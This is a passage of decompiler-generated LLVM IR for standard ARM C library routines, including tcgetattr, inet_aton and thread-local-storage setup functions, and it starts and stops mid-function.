  %v2_16e24 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_16e24, i32* @r1, align 4
  %v0_16e28 = call i32 @__GI_tcgetattr()
  %v1_16e2c = sub i32 1, %v0_16e28
  %v2_16e2c = icmp ult i32 %v0_16e28, 2
  br i1 %v2_16e2c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_16e3c = phi i32 [ %v1_16e2c, %entry ], [ 0, %bb ]
  ret i32 %v1_16e3c

; uselistorder directives
  uselistorder i32 %v0_16e28, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_16e40 = load i32, i32* @r4, align 4
  %v6_16e40 = load i32, i32* @r5, align 4
  %v9_16e40 = load i32, i32* @r6, align 4
  %v2_16e48 = ptrtoint i32* %stack_var_-52 to i32
  %v0_16e4c = load i32, i32* @r1, align 4
  store i32 %v0_16e4c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_16e58 = load i32, i32* @r0, align 4
  %v3_16e58 = call i32 @ioctl(i32 %v0_16e58, i32 21505, i32 %v2_16e48)
  store i32 %v3_16e58, i32* %r0.global-to-local, align 4
  store i32 %v3_16e58, i32* @r5, align 4
  %v2_16e5c = icmp eq i32 %v3_16e58, 0
  br i1 %v2_16e5c, label %dec_label_pc_16e64, label %dec_label_pc_16ea8

dec_label_pc_16e64:                               ; preds = %entry
  %v4_16e70 = zext i8 %tmp to i32
  store i32 %v4_16e70, i32* @ip, align 4
  %v3_16e74 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_16e74, i32* @r3, align 4
  %v1_16e78 = load i32, i32* @r4, align 4
  %v2_16e78 = add i32 %v1_16e78, 4
  %v3_16e78 = inttoptr i32 %v2_16e78 to i32*
  %v0_16e7c = load i32, i32* %r1.global-to-local, align 4
  %v1_16e7c = load i32, i32* @r4, align 4
  %v2_16e7c = add i32 %v1_16e7c, 8
  %v3_16e7c = inttoptr i32 %v2_16e7c to i32*
  store i32 %v0_16e7c, i32* %v3_16e7c, align 4
  %v0_16e80 = load i32, i32* %r0.global-to-local, align 4
  %v1_16e80 = load i32, i32* @r4, align 4
  %v2_16e80 = add i32 %v1_16e80, 12
  %v3_16e80 = inttoptr i32 %v2_16e80 to i32*
  store i32 %v0_16e80, i32* %v3_16e80, align 4
  %v2_16e84 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_16e84, i32* @r1, align 4
  %v1_16e8c = load i32, i32* @r4, align 4
  %v2_16e8c = inttoptr i32 %v1_16e8c to i32*
  store i32 %v3_16e74, i32* %v2_16e8c, align 4
  %v0_16e90 = load i32, i32* @ip, align 4
  %v1_16e90 = trunc i32 %v0_16e90 to i8
  %v2_16e90 = load i32, i32* @r4, align 4
  %v3_16e90 = add i32 %v2_16e90, 16
  %v4_16e90 = inttoptr i32 %v3_16e90 to i8*
  store i8 %v1_16e90, i8* %v4_16e90, align 1
  %v0_16e94 = load i32, i32* @r4, align 4
  %v1_16e94 = add i32 %v0_16e94, 17
  store i32 %v1_16e94, i32* %r0.global-to-local, align 4
  %v4_16e98 = call i32 @__GI_mempcpy(i32 %v1_16e94, i32 %v2_16e84, i32 19, i32 %v3_16e74)
  store i32 %v4_16e98, i32* %r0.global-to-local, align 4
  %v0_16e9c = load i32, i32* @r5, align 4
  store i32 %v0_16e9c, i32* %r1.global-to-local, align 4
  %v3_16ea4 = inttoptr i32 %v4_16e98 to i8*
  %v4_16ea4 = call i32 @__GI_memset(i8* %v3_16ea4, i32 %v0_16e9c, i32 13)
  store i32 %v4_16ea4, i32* %r0.global-to-local, align 4
  %v0_16ea8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16ea8

dec_label_pc_16ea8:                               ; preds = %entry, %dec_label_pc_16e64
  %v0_16ea8 = phi i32 [ %v3_16e58, %entry ], [ %v0_16ea8.pre, %dec_label_pc_16e64 ]
  store i32 %v0_16ea8, i32* %r0.global-to-local, align 4
  store i32 %v3_16e40, i32* @r4, align 4
  store i32 %v6_16e40, i32* @r5, align 4
  store i32 %v9_16e40, i32* @r6, align 4
  ret i32 %v0_16ea8

; uselistorder directives
  uselistorder i32 %v0_16ea8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 14, 1, 4, 15, 16, 5, 17, 6, 7, 8, 9, 2, 18, 3, 19, 20, 10, 21, 11, 22, 23, 24, 0, 25, 12, 26, 13 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ea8, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_16ebc = load i32, i32* @r4, align 4
  store i32 %v3_16ebc, i32* %stack_var_-28, align 4
  %v0_16ec4 = load i32, i32* @r0, align 4
  %v2_16ec4 = icmp eq i32 %v0_16ec4, 0
  %v0_16ecc = load i32, i32* @r1, align 4
  br i1 %v2_16ec4, label %dec_label_pc_16fa0, label %dec_label_pc_16ed4

dec_label_pc_16ed4:                               ; preds = %entry
  br label %dec_label_pc_16eec

dec_label_pc_16eec:                               ; preds = %dec_label_pc_16ed4, %dec_label_pc_16f64
  %v1_16f64 = phi i32 [ 0, %dec_label_pc_16ed4 ], [ %v5_16f64, %dec_label_pc_16f64 ]
  %v0_16f68 = phi i32 [ 1, %dec_label_pc_16ed4 ], [ %v1_16f68, %dec_label_pc_16f64 ]
  %v0_16eec = phi i32 [ %v0_16ec4, %dec_label_pc_16ed4 ], [ %v0_16eec13, %dec_label_pc_16f64 ]
  %v1_16eec = inttoptr i32 %v0_16eec to i8*
  %v2_16eec = load i8, i8* %v1_16eec, align 1
  %v3_16eec = zext i8 %v2_16eec to i32
  %v4_16ef0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 272) to i32*), align 4
  %v2_16ef4 = mul nuw nsw i32 %v3_16eec, 2
  %v2_16ef8 = add i32 %v2_16ef4, %v4_16ef0
  %v3_16ef8 = inttoptr i32 %v2_16ef8 to i16*
  %v4_16ef8 = load i16, i16* %v3_16ef8, align 2
  %v1_16efc = and i16 %v4_16ef8, 8
  %v2_16efc = icmp eq i16 %v1_16efc, 0
  br i1 %v2_16efc, label %dec_label_pc_16fa0, label %dec_label_pc_16f04

dec_label_pc_16f04:                               ; preds = %dec_label_pc_16eec
  br label %dec_label_pc_16f24

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16f24
  %v2_16f0c = mul i32 %v0_16f64, 10
  %v1_16f10 = add i32 %v2_16f0c, -48
  %v2_16f14 = add i32 %v3_16f24, %v1_16f10
  %v8_16f1c = icmp sgt i32 %v2_16f14, 255
  br i1 %v8_16f1c, label %dec_label_pc_16fa0, label %dec_label_pc_16f20

dec_label_pc_16f20:                               ; preds = %dec_label_pc_16f0c
  %v1_16f20 = add i32 %v0_16f54, 1
  store i32 %v1_16f20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f24

dec_label_pc_16f24:                               ; preds = %dec_label_pc_16f04, %dec_label_pc_16f20
  %v0_16f64 = phi i32 [ 0, %dec_label_pc_16f04 ], [ %v2_16f14, %dec_label_pc_16f20 ]
  %v0_16f54 = phi i32 [ %v0_16eec, %dec_label_pc_16f04 ], [ %v1_16f20, %dec_label_pc_16f20 ]
  %v1_16f24 = inttoptr i32 %v0_16f54 to i8*
  %v2_16f24 = load i8, i8* %v1_16f24, align 1
  %v3_16f24 = zext i8 %v2_16f24 to i32
  %v2_16f28 = mul nuw nsw i32 %v3_16f24, 2
  %v2_16f2c = add i32 %v2_16f28, %v4_16ef0
  %v3_16f2c = inttoptr i32 %v2_16f2c to i16*
  %v4_16f2c = load i16, i16* %v3_16f2c, align 2
  %v6_16f2c = zext i16 %v4_16f2c to i32
  %v1_16f30 = and i32 %v6_16f2c, 8
  %v2_16f30 = icmp eq i32 %v1_16f30, 0
  br i1 %v2_16f30, label %dec_label_pc_16f38, label %dec_label_pc_16f0c

dec_label_pc_16f38:                               ; preds = %dec_label_pc_16f24
  %v7_16f38 = icmp eq i32 %v0_16f68, 4
  br i1 %v7_16f38, label %dec_label_pc_16f50, label %dec_label_pc_16f40

dec_label_pc_16f40:                               ; preds = %dec_label_pc_16f38
  %v7_16f40 = icmp eq i8 %v2_16f24, 46
  br i1 %v7_16f40, label %dec_label_pc_16f48, label %dec_label_pc_16fa0

dec_label_pc_16f48:                               ; preds = %dec_label_pc_16f40
  %v1_16f48 = add i32 %v0_16f54, 1
  store i32 %v1_16f48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f64

dec_label_pc_16f50:                               ; preds = %dec_label_pc_16f38
  %v2_16f50 = icmp eq i8 %v2_16f24, 0
  %v1_16f54 = add i32 %v0_16f54, 1
  store i32 %v1_16f54, i32* %r0.global-to-local, align 4
  br i1 %v2_16f50, label %dec_label_pc_16f64, label %dec_label_pc_16f5c

dec_label_pc_16f5c:                               ; preds = %dec_label_pc_16f50
  %v1_16f5c = and i32 %v6_16f2c, 32
  %v2_16f5c = icmp eq i32 %v1_16f5c, 0
  br i1 %v2_16f5c, label %dec_label_pc_16fa0, label %dec_label_pc_16f64

dec_label_pc_16f64:                               ; preds = %dec_label_pc_16f5c, %dec_label_pc_16f50, %dec_label_pc_16f48
  %v0_16eec13 = phi i32 [ %v1_16f54, %dec_label_pc_16f5c ], [ %v1_16f54, %dec_label_pc_16f50 ], [ %v1_16f48, %dec_label_pc_16f48 ]
  %v4_16f64 = mul i32 %v1_16f64, 256
  %v5_16f64 = or i32 %v0_16f64, %v4_16f64
  %v1_16f68 = add nuw nsw i32 %v0_16f68, 1
  %v7_16f70 = icmp slt i32 %v1_16f68, 5
  br i1 %v7_16f70, label %dec_label_pc_16eec, label %dec_label_pc_16f74

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16f64
  %v2_16f74 = icmp eq i32 %v0_16ecc, 0
  br i1 %v2_16f74, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_16f74
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16fa4

bb:                                               ; preds = %dec_label_pc_16f74
  %v4_16f78 = udiv i32 %v5_16f64, 16777216
  %v2_16f7c = udiv i32 %v5_16f64, 256
  %v5_16f80 = and i32 %v2_16f7c, 65280
  %v2_16f84 = and i32 %v5_16f64, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v5_16f88 = mul i32 %v2_16f84, 256
  %v5_16f8c = mul i32 %v0_16f64, 16777216
  %v6_16f80 = or i32 %v4_16f78, %v5_16f8c
  %v6_16f88 = or i32 %v6_16f80, %v5_16f80
  %v6_16f8c = or i32 %v6_16f88, %v5_16f88
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_16f98 = inttoptr i32 %v0_16ecc to i32*
  store i32 %v6_16f8c, i32* %v3_16f98, align 4
  %v2_16fa4.pre = load i32, i32* %stack_var_-28, align 4
  %v1_16fa8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16fa4

dec_label_pc_16fa0:                               ; preds = %dec_label_pc_16f40, %dec_label_pc_16f5c, %dec_label_pc_16eec, %dec_label_pc_16f0c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16fa4

dec_label_pc_16fa4:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_16fa0
  %v1_16fa8 = phi i32 [ %v1_16fa8.pre, %bb ], [ 0, %dec_label_pc_16fa0 ], [ 1, %.thread8.thread ]
  %v2_16fa4 = phi i32 [ %v2_16fa4.pre, %bb ], [ %v3_16ebc, %dec_label_pc_16fa0 ], [ %v3_16ebc, %.thread8.thread ]
  store i32 %v2_16fa4, i32* @r4, align 4
  ret i32 %v1_16fa8

; uselistorder directives
  uselistorder i32 %v1_16f68, { 1, 0 }
  uselistorder i32 %v5_16f64, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16f54, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.32 to i32), { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 65280, { 0, 1, 9, 2, 3, 46, 10, 11, 4, 12, 47, 43, 13, 14, 15, 16, 17, 44, 5, 48, 45, 6, 49, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 50, 28, 29, 30, 31, 32, 33, 51, 34, 35, 36, 37, 52, 38, 39, 40, 41, 42, 7, 8 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 5, 6, 0, 1, 2, 9, 11, 10, 7, 12, 8, 13, 3, 4 }
  uselistorder i16 0, { 0, 1, 2, 11, 12, 3, 4, 13, 14, 15, 16, 17, 18, 19, 20, 5, 21, 6, 22, 23, 24, 7, 8, 9, 10, 25, 26 }
  uselistorder i32 272, { 1, 0 }
  uselistorder label %dec_label_pc_16fa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16fa0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_16f24, { 1, 0 }
  uselistorder label %dec_label_pc_16eec, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_16fc0 = load i32, i32* @r4, align 4
  store i32 %v3_16fc0, i32* %stack_var_-16, align 4
  %v4_16fc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_16fcc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_16fd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 36) to i32*), align 4
  store i32 %v4_16fd4, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_16fdc = inttoptr i32 %v4_16fc4 to i32*
  %v2_16fdc = load i32, i32* %v1_16fdc, align 4
  %v4_16fe0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 52) to i32*), align 4
  store i32 %v4_16fe0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_16fe8 = add i32 %v2_16fdc, 15
  %v4_16fec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 144) to i32*), align 4
  store i32 %v4_16fec, i32* @ip, align 4
  %v1_16ff0 = load i32, i32* @r0, align 4
  %v2_16ff0 = add i32 %v1_16ff0, %v1_16fe8
  %v1_16ff4 = inttoptr i32 %v4_16fcc to i32*
  %v2_16ff4 = load i32, i32* %v1_16ff4, align 4
  store i32 %v2_16ff4, i32* %r3.global-to-local, align 4
  %v1_16ff8 = and i32 %v2_16ff0, -16
  store i32 %v1_16ff8, i32* %v1_16fdc, align 4
  %v0_17000 = load i32, i32* @r0, align 4
  %v1_17000 = load i32, i32* %r4.global-to-local, align 4
  %v2_17000 = inttoptr i32 %v1_17000 to i32*
  store i32 %v0_17000, i32* %v2_17000, align 4
  %v0_17004 = load i32, i32* @r1, align 4
  %v1_17004 = load i32, i32* %lr.global-to-local, align 4
  %v2_17004 = inttoptr i32 %v1_17004 to i32*
  store i32 %v0_17004, i32* %v2_17004, align 4
  %v0_17008 = load i32, i32* %r3.global-to-local, align 4
  %v1_17008 = load i32, i32* @ip, align 4
  %v2_17008 = inttoptr i32 %v1_17008 to i32*
  store i32 %v0_17008, i32* %v2_17008, align 4
  %v2_1700c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1700c, i32* %r4.global-to-local, align 4
  %v1_17010 = load i32, i32* @r0, align 4
  ret i32 %v1_17010

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_17018(i32 %arg1) local_unnamed_addr {
dec_label_pc_17018:
  %v0_17018 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17018, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17018
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17018, %bb
  %v4_17028 = phi i32 [ %arg1, %dec_label_pc_17018 ], [ 0, %bb ]
  ret i32 %v4_17028

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r3.global-to-local, align 4
  %v4_1703c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 84) to i32*), align 4
  store i32 %v4_1703c, i32* @lr, align 4
  %v4_17048 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 10744) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 10744), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_17068 = inttoptr i32 %v4_17048 to i32*
  store i32 1, i32* %v2_17068, align 4
  %v0_1706c = load i32, i32* %r3.global-to-local, align 4
  %v1_1706c = load i32, i32* @lr, align 4
  %v2_1706c = inttoptr i32 %v1_1706c to i32*
  store i32 %v0_1706c, i32* %v2_1706c, align 4
  %v0_17070 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_17088(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17088:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17088 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17088, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17088
  %v2_17088 = load i32, i32* @r4, align 4
  %v8_17088 = ashr i32 %v2_17088, %tmp
  %v9_17088 = and i32 %v8_17088, %tmp
  %v2_1708c = load i32, i32* @ip, align 4
  %v8_1708c = lshr i32 %v2_1708c, %v9_17088
  %v9_1708c = and i32 %v8_1708c, %v9_17088
  store i32 %v9_1708c, i32* %r0.global-to-local, align 4
  %v4_17090 = inttoptr i32 %v9_1708c to i32*
  store i32 %arg2, i32* %v4_17090, align 4
  %v5_17090 = load i32, i32* @r8, align 4
  %v6_17090 = load i32, i32* %r0.global-to-local, align 4
  %v7_17090 = sub i32 %v6_17090, %v5_17090
  store i32 %v7_17090, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17088, %bb
  %v8_17090 = phi i32 [ %tmp, %dec_label_pc_17088 ], [ %v7_17090, %bb ]
  ret i32 %v8_17090

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1709c = call i32 @__aeabi_read_tp()
  %v1_170a0 = inttoptr i32 %v0_1709c to i32*
  %v2_170a0 = load i32, i32* %v1_170a0, align 4
  %v1_170a4 = add i32 %arg1, 4
  %v2_170a4 = inttoptr i32 %v1_170a4 to i32*
  %v3_170a4 = load i32, i32* %v2_170a4, align 4
  %v1_170a8 = add i32 %v2_170a0, 8
  %v2_170a8 = inttoptr i32 %v1_170a8 to i32*
  %v3_170a8 = load i32, i32* %v2_170a8, align 4
  %v2_170ac = add i32 %v3_170a8, %v3_170a4
  ret i32 %v2_170ac
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_170b8 = load i32, i32* @r4, align 4
  store i32 %v3_170b8, i32* %stack_var_-36, align 4
  %v6_170b8 = load i32, i32* @r5, align 4
  %v15_170b8 = load i32, i32* @r8, align 4
  %v18_170b8 = load i32, i32* @sb, align 4
  %v21_170b8 = load i32, i32* @sl, align 4
  %v24_170b8 = load i32, i32* @fp, align 4
  %v27_170b8 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %sl.global-to-local, align 4
  %v4_170c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 104) to i32*), align 4
  store i32 %v4_170c8, i32* %r3.global-to-local, align 4
  %v1_170cc = inttoptr i32 %v4_170c8 to i32*
  %v2_170cc = load i32, i32* %v1_170cc, align 4
  store i32 %v2_170cc, i32* %r2.global-to-local, align 4
  %v2_170d0 = icmp eq i32 %v2_170cc, 0
  %v0_170d8 = load i32, i32* %r0.global-to-local, align 4
  %v0_170dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_170dc, i32* %ip.global-to-local, align 4
  br i1 %v2_170d0, label %dec_label_pc_172a4, label %dec_label_pc_170e4

dec_label_pc_170e4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_170e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 156) to i32*), align 4
  store i32 %v4_170e8, i32* @lr, align 4
  store i32 %v2_170cc, i32* %r1.global-to-local, align 4
  %v1_17130 = inttoptr i32 %v4_170e8 to i32*
  %v2_1713061 = load i32, i32* %v1_17130, align 4
  %v4_1713462 = mul i32 %v2_1713061, 32
  %v5_1713463 = add i32 %v4_1713462, %v2_170cc
  store i32 %v5_1713463, i32* %r3.global-to-local, align 4
  %v3_1713865 = icmp ult i32 %v2_170cc, %v5_1713463
  br i1 %v3_1713865, label %dec_label_pc_170f4, label %dec_label_pc_172a4.loopexit

dec_label_pc_170f4:                               ; preds = %dec_label_pc_170e4, %dec_label_pc_1712c
  %v0_1710c66 = phi i32 [ %v1_1712c, %dec_label_pc_1712c ], [ %v2_170cc, %dec_label_pc_170e4 ]
  %v1_170f4 = inttoptr i32 %v0_1710c66 to i32*
  %v2_170f4 = load i32, i32* %v1_170f4, align 4
  store i32 %v2_170f4, i32* %r3.global-to-local, align 4
  %v7_170f8 = icmp eq i32 %v2_170f4, 7
  br i1 %v7_170f8, label %dec_label_pc_17100, label %dec_label_pc_1712c

dec_label_pc_17100:                               ; preds = %dec_label_pc_170f4
  %v1_17100 = add i32 %v0_1710c66, 20
  %v2_17100 = inttoptr i32 %v1_17100 to i32*
  %v3_17100 = load i32, i32* %v2_17100, align 4
  store i32 %v3_17100, i32* %r3.global-to-local, align 4
  %v1_17104 = add i32 %v0_1710c66, 28
  %v2_17104 = inttoptr i32 %v1_17104 to i32*
  %v3_17104 = load i32, i32* %v2_17104, align 4
  store i32 %v3_17104, i32* @r6, align 4
  %v1_1710c = add i32 %v0_1710c66, 16
  %v2_1710c = inttoptr i32 %v1_1710c to i32*
  %v3_1710c = load i32, i32* %v2_1710c, align 4
  store i32 %v3_1710c, i32* %r3.global-to-local, align 4
  %v1_17110 = add i32 %v0_1710c66, 8
  %v2_17110 = inttoptr i32 %v1_17110 to i32*
  %v3_17110 = load i32, i32* %v2_17110, align 4
  store i32 %v3_17110, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_17104, %v0_170dc
  %v0_170dc.v3_17104 = select i1 %tmp78, i32 %v0_170dc, i32 %v3_17104
  store i32 %v0_170dc.v3_17104, i32* %fp.global-to-local, align 4
  %v2_17148 = icmp eq i32 %v3_17104, 0
  br i1 %v2_17148, label %dec_label_pc_17170, label %bb

dec_label_pc_1712c:                               ; preds = %dec_label_pc_170f4
  %v1_1712c = add i32 %v0_1710c66, 32
  store i32 %v1_1712c, i32* %r1.global-to-local, align 4
  %v2_17130 = load i32, i32* %v1_17130, align 4
  %v4_17134 = mul i32 %v2_17130, 32
  %v5_17134 = add i32 %v4_17134, %v2_170cc
  store i32 %v5_17134, i32* %r3.global-to-local, align 4
  %v3_17138 = icmp ult i32 %v1_1712c, %v5_17134
  br i1 %v3_17138, label %dec_label_pc_170f4, label %dec_label_pc_17130.dec_label_pc_172a4.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_17100
  %v2_1714c = add i32 %v3_17104, -1
  br label %dec_label_pc_17174

dec_label_pc_17170:                               ; preds = %dec_label_pc_17100, %dec_label_pc_172a4
  %v0_17184.pre = phi i32 [ %v0_17184.pre.pre, %dec_label_pc_172a4 ], [ ptrtoint (i32* @global_var_214b8.340 to i32), %dec_label_pc_17100 ]
  %v1_17174.pre = phi i32 [ %v1_17174.pre.pre, %dec_label_pc_172a4 ], [ %v0_170d8, %dec_label_pc_17100 ]
  %v1_1719825 = phi i32 [ %v0_172ac, %dec_label_pc_172a4 ], [ %v0_170dc.v3_17104, %dec_label_pc_17100 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_172a4 ], [ %v3_17100, %dec_label_pc_17100 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_172a4 ], [ %v3_1710c, %dec_label_pc_17100 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_172a4 ], [ %v3_17110, %dec_label_pc_17100 ]
  br label %dec_label_pc_17174

dec_label_pc_17174:                               ; preds = %bb, %dec_label_pc_17170
  %storemerge80 = phi i32 [ %v2_1714c, %bb ], [ 0, %dec_label_pc_17170 ]
  %v0_17174 = phi i32 [ %v2_1714c, %bb ], [ 0, %dec_label_pc_17170 ]
  %storemerge = phi i32 [ %v3_17104, %bb ], [ 1, %dec_label_pc_17170 ]
  %storemerge79 = phi i32 [ %v3_17104, %bb ], [ 1, %dec_label_pc_17170 ]
  %v0_17184 = phi i32 [ ptrtoint (i32* @global_var_214b8.340 to i32), %bb ], [ %v0_17184.pre, %dec_label_pc_17170 ]
  %v1_17174 = phi i32 [ %v0_170d8, %bb ], [ %v1_17174.pre, %dec_label_pc_17170 ]
  %v1_17198 = phi i32 [ %v0_170dc.v3_17104, %bb ], [ %v1_1719825, %dec_label_pc_17170 ]
  %stack_var_-52.3 = phi i32 [ %v3_17100, %bb ], [ %stack_var_-52.0, %dec_label_pc_17170 ]
  %stack_var_-48.3 = phi i32 [ %v3_1710c, %bb ], [ %stack_var_-48.0, %dec_label_pc_17170 ]
  %stack_var_-44.3 = phi i32 [ %v3_17110, %bb ], [ %stack_var_-44.0, %dec_label_pc_17170 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_17174 = add i32 %v1_17174, %v0_17174
  %v2_17178 = udiv i32 %v2_17174, %storemerge
  store i32 %v2_17178, i32* %r0.global-to-local, align 4
  %v2_1717c = mul i32 %v2_17178, %storemerge
  store i32 %v2_1717c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_17184 = add i32 %v0_17184, 72
  %v3_17184 = inttoptr i32 %v2_17184 to i32*
  %v4_17184 = load i32, i32* %v3_17184, align 4
  store i32 %v4_17184, i32* %r3.global-to-local, align 4
  %v1_17188 = inttoptr i32 %v4_17184 to i32*
  %v2_17188 = load i32, i32* %v1_17188, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_17190 = add i32 %v1_17198, 1168
  %v2_17194 = add i32 %v1_17190, %stack_var_-52.3
  %v2_17198 = add i32 %v2_17194, %v2_1717c
  %v2_1719c = add i32 %v2_17198, %v2_17188
  store i32 %v2_1719c, i32* %r0.global-to-local, align 4
  %v1_171a0 = call i32 @__GI_sbrk(i32 %v2_1719c)
  %v1_171a4 = load i32, i32* %fp.global-to-local, align 4
  %v1_171ac = sub i32 0, %v1_171a4
  store i32 10232, i32* %r4.global-to-local, align 4
  %v2_171a4 = add i32 %v1_171a0, 1167
  %v1_171b4 = add i32 %v2_171a4, %v1_171a4
  %v2_171b8 = and i32 %v1_171b4, %v1_171ac
  store i32 %v2_171b8, i32* @r5, align 4
  %v1_171c0 = load i32, i32* %sl.global-to-local, align 4
  %v3_171c0 = add i32 %v1_171c0, 10232
  %v4_171c0 = inttoptr i32 %v3_171c0 to i32*
  store i32 62, i32* %v4_171c0, align 4
  %v0_171c8 = load i32, i32* @r5, align 4
